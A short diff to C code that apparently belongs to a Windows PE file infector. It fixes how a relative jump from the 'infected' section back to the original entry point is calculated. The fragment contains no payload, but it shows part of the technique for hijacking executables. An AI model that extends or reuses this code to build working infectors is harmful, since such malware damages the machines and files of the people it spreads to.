@@ -85,7 +85,7 @@ DWORD get_relative_jump(EXE_file* infected, DWORD jump_address)
     relative_jump = jump_address + 4;
 
     // switch from row data to RVA.
-    relative_jump = relative_jump - (DWORD)infected->mapped_handle - (DWORD)infected->last_section->PointerToRawData + (DWORD)infected->last_section->VirtualAddress;
+    relative_jump = relative_jump - (DWORD)infected->mapped_handle - (DWORD)infected->infected_section->PointerToRawData + (DWORD)infected->infected_section->VirtualAddress;
     // switch to virtual address.
     relative_jump += (DWORD)infected->headers->OptionalHeader.ImageBase;
     relative_jump = (DWORD)infected->entry_address - relative_jump;
